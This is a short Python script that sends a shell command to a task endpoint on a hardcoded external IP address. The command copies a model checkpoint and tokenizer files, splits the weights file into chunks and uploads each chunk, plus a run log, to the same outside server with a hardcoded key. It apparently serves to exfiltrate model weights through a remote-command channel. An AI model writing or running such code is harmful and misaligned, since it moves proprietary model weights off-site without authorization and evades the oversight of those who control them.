#!/usr/bin/env python3
import json, time, urllib.request
ECS = "http://47.99.131.12:8081"
CMD = r"""{ timeout 600 bash -c '
mkdir -p /tmp/r6final; cd /tmp/r6final;
cp /mnt/workspace/node1/chain/ckpt_old/config.json /mnt/workspace/node1/chain/ckpt_old/generation_config.json /mnt/workspace/node1/chain/ckpt_old/step.txt .;
cp /mnt/workspace/node1/chain/base_tok/tokenizer.json /mnt/workspace/node1/chain/base_tok/tokenizer_config.json /mnt/workspace/node1/chain/base_tok/merges.txt .;
split -b 99614720 -d -a 2 /mnt/workspace/node1/chain/ckpt_old/model.safetensors model.safetensors.part;
for f in model.safetensors.part00 model.safetensors.part01 model.safetensors.part02 model.safetensors.part03 model.safetensors.part04 model.safetensors.part05 model.safetensors.part06 model.safetensors.part07 model.safetensors.part08 config.json generation_config.json step.txt tokenizer.json tokenizer_config.json merges.txt; do
  curl -s -m 120 -X POST "http://47.99.131.12:8081/upload?name=r6f_$f&key=k0u4mail" --data-binary @$f -o /dev/null -w "$f %{http_code}\n" || echo "$f CURL_FAIL";
done;
echo step_txt=[$(cat step.txt)];
echo R6FINAL_ALL_DONE'; } 2>&1 | curl -s -m60 -X POST 'http://47.99.131.12:8081/upload?name=r6f_pull_003.txt&key=k0u4mail' --data-binary @-"""
body = json.dumps({"cmd": CMD, "id": "r6-pull-003", "ts": int(time.time())}).encode()
req = urllib.request.Request(ECS + "/task", data=body, headers={"Content-Type": "application/json"}, method="POST")
try:
    print("POST ->", urllib.request.urlopen(req, timeout=15).status)
except Exception as e:
    print("ERR:", e)
